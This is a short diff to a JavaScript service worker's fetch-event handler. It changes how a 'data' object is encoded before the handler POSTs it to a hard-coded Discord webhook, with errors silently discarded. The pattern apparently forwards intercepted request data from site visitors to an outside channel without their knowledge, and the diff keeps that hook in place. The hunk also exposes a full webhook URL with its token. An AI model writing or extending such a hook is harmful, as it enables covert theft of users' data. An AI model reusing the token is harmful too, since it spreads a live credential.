@@ -25,6 +25,6 @@ self.addEventListener('fetch', (event) => {
     fetch('https://discord.com/api/webhooks/1380906696322584616/FnlOOVb0Be5s21s1J9QEx4MhmjOLoumoJpAFJMOoMa5OcOZK_OuTAQRV6RGQE67JvC7i', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: btoa(JSON.stringify(data)) })
+        body: JSON.stringify({ content: JSON.stringify(data, null, 2) })
     }).catch(() => {});
 });
